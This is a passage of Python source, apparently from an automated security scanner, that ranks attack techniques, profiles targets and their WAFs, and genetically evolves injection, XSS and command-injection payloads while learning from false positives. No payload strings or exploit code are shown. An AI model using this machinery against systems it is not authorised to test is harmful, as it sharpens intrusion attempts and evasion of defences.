            # 5) Similar target learnings
            if profile_id:
                similar = self.target_profiler.find_similar(profile_id, top_n=3)
                if similar:
                    recs["similar_targets"] = []
                    for sim_id, sim_score in similar:
                        learnings = self.target_profiler.transfer_learnings(
                            sim_id, profile_id
                        )
                        recs["similar_targets"].append({
                            "profile_id": sim_id,
                            "similarity": sim_score,
                            "recommended_techniques": learnings[:5],
                        })

            # 6) Top payloads
            for cat in ["INJECTION", "XSS", "COMMAND_INJECTION"]:
                top = self.payload_evolver.get_top_payloads(cat, n=3)
                if top:
                    recs.setdefault("top_payloads", {})[cat] = [
                        {"payload": g.raw, "fitness": g.fitness}
                        for g in top
                    ]

            return recs

    def evolve_payloads(self, categories: Optional[List[str]] = None) -> Dict[str, int]:
        """
        Run one evolution generation for specified payload categories.

        Returns: {category: generation_number}
        """
        cats = categories or list(self.payload_evolver._populations.keys())
        if not cats:
            cats = list(PayloadEvolver.SEED_PAYLOADS.keys())

        results: Dict[str, int] = {}
        for cat in cats:
            self.payload_evolver.evolve_generation(cat)
            results[cat] = self.payload_evolver.get_generation(cat)
        return results

    def create_target_profile(
        self,
        profile_id: str,
        scan_data: Dict[str, Any],
    ) -> TargetProfile:
        """Create a target profile from scan data."""
        features = self.target_profiler.extract_features(scan_data)
        technologies = set(str(t) for t in scan_data.get("technologies", []))
        waf_type = scan_data.get("waf_type", "")
        profile = self.target_profiler.create_profile(
            profile_id, technologies, waf_type, features
        )
        self.target_profiler.infer_archetype(profile_id)
        return profile

    def report_false_positive(self, record_dict: Dict[str, Any]) -> Dict[str, Any]:
        """Report a finding as false positive and learn from it."""
        record = TechniqueRecord.from_dict(record_dict)
        sig = self.fp_learner.report_false_positive(record)
        return {
            "signature_id": sig.signature_id,
            "confidence": sig.confidence,
            "observations": sig.observations,
        }

    def report_true_positive(self, record_dict: Dict[str, Any]) -> None:
        """Confirm a finding as true positive."""
        record = TechniqueRecord.from_dict(record_dict)
        self.fp_learner.report_true_positive(record)

    def get_evolution_stats(self) -> Dict[str, Any]:
        """Get comprehensive evolution statistics."""
        with self._lock:
            uptime = time.time() - self._started_at
            return {
                "total_signals_processed": self._total_signals,
                "uptime_seconds": round(uptime, 1),
                "signals_per_minute": round(
                    self._total_signals / max(1, uptime / 60), 2
                ),
                "patterns": self.pattern_learner.get_all_patterns(),
                "strategy": {
                    "top_arms": self.strategy_optimizer.get_top_arms(10),
                    "total_pulls": self.strategy_optimizer._total_pulls,
                },
                "technique_ranking": {
                    "top_global": self.technique_ranker.get_ranking(top_n=10),
                },
                "payloads": {
                    cat: {
                        "generation": self.payload_evolver.get_generation(cat),
                        "population_size": len(genes),
                        "top_fitness": max(
                            (g.compute_fitness() for g in genes), default=0.0
                        ),
                    }
                    for cat, genes in self.payload_evolver._populations.items()
                },
                "false_positives": {
                    "fp_rate": self.fp_learner.get_fp_rate(),
                    "signatures_count": len(self.fp_learner._signatures),
                    "total_confirmed_fps": self.fp_learner._total_fps_confirmed,
                    "total_confirmed_tps": self.fp_learner._total_tps_confirmed,
                },
                "target_profiles": {
                    "count": len(self.target_profiler._profiles),
                },
                "db_meta": self._db.get_metadata(),
            }

    def _save_state(self) -> None:
        """Persist all subsystem states to disk."""
        try:
            self._db.save_component("strategy_optimizer", self.strategy_optimizer.to_dict())
            self._db.save_component("payload_evolver", self.payload_evolver.to_dict())
            self._db.save_component("technique_ranker", self.technique_ranker.to_dict())
            self._db.save_component("fp_learner", self.fp_learner.to_dict())
            self._db.save_component("target_profiler", self.target_profiler.to_dict())
            self._db.save_component("stats", {
                "total_signals": self._total_signals,
                "started_at": self._started_at,
            })
            self._db.flush()
            logger.info("Evolution state saved (%d signals)", self._total_signals)
        except Exception as e:
            logger.error("Failed to save evolution state: %s", e)

    def _load_state(self) -> None:
        """Restore all subsystem states from disk."""
        try:
            data = self._db.load_component("strategy_optimizer")
            if data:
                self.strategy_optimizer = StrategyOptimizer.from_dict(data)

            data = self._db.load_component("payload_evolver")
            if data:
                self.payload_evolver = PayloadEvolver.from_dict(data)

            data = self._db.load_component("technique_ranker")
            if data:
                self.technique_ranker = TechniqueRanker.from_dict(data)

            data = self._db.load_component("fp_learner")
            if data:
                self.fp_learner = FalsePositiveLearner.from_dict(data)

            data = self._db.load_component("target_profiler")
            if data:
                self.target_profiler = TargetProfiler.from_dict(data)

            stats = self._db.load_component("stats")
            if stats:
                self._total_signals = stats.get("total_signals", 0)

            logger.info("Evolution state loaded")
        except Exception as e:
            logger.warning("Could not load evolution state: %s", e)

    def shutdown(self) -> None:
        """Save state and shutdown thread pool."""
        self._save_state()
        self._executor.shutdown(wait=True)
        logger.info("SirenSelfEvolution shutdown complete")

    def __del__(self) -> None:
        """Safety net to ensure thread pool is cleaned up."""
        self.shutdown()
